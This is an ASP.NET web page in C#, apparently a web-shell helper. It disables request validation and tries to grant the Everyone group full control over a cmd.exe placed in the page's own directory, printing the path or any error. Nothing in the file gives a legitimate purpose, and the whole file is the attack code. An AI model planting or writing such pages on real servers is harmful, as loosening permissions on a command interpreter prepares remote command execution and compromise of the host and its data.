<%@ Page Language="C#" ValidateRequest="false" %>
<%@ import Namespace="System.Security.AccessControl"%>
<%@ import Namespace="System.Security.Principal"%>
<%@ import Namespace="System.IO"%>

<%
String pwd  = Path.GetDirectoryName(Request.PhysicalPath);
String path = pwd + @"\cmd.exe";

Response.Write ("Using " + path + "<br/>");

try {
    SecurityIdentifier everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
    DirectorySecurity sec = Directory.GetAccessControl(path);
    sec.AddAccessRule(new FileSystemAccessRule(everyone, FileSystemRights.FullControl, 
                InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, 
                PropagationFlags.None, AccessControlType.Allow));
    Directory.SetAccessControl(path, sec);
} catch (Exception ex) {
    Response.Write (ex.Message);
}

%>
